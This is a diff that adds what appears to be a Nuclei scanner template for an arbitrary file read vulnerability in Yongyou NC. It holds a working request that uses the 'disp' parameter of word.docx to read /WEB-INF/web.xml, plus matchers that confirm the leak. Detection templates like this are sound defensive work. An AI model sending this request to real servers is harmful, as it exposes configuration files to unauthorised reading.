@@ -1,0 +1,27 @@
+id: yongyou-nc-word-docx-anyfile-read
+
+info:
+  name: Yongyou NC Word.docx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<display-name>NC Portal</display-name>"
+          - "<filter>"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
